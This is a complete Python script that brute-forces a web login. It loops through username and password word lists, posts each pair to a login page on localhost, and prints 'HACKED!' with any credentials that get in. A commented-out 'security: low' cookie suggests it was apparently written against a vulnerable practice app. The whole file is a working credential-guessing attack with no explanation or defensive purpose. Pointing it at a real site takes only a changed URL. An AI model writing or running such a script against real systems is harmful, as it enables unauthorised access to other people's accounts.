import requests

def crack(usr, pwd):
    url = f'http://localhost/page.php'
    #cookies = {
    #    "security": "low",
    #    "PHPSESSID": "pdsgk72dnc5bs6dh95mknadf34"    
    #}
    params = {
        "username": usr,
        "password": pwd,
        "Login": "Login"    
    }
    r = requests.post(url, params)#, cookies=cookies)
    #fail = f"Username and/or password incorrect."
    success = f"Welcome to the password protected area"
    if success in r.text:
        print(f"HACKED!\nLogin: {usr}\nPassword: {pwd}")

def bruteforce():
    with open('userstable.txt', 'r') as f:
        usernames = [row.strip() for row in f]

    with open('passtable.txt', 'r') as f:
        passwords = [row.strip() for row in f]

    for usr in usernames:
        for pwd in passwords:
            crack(usr, pwd)

bruteforce()

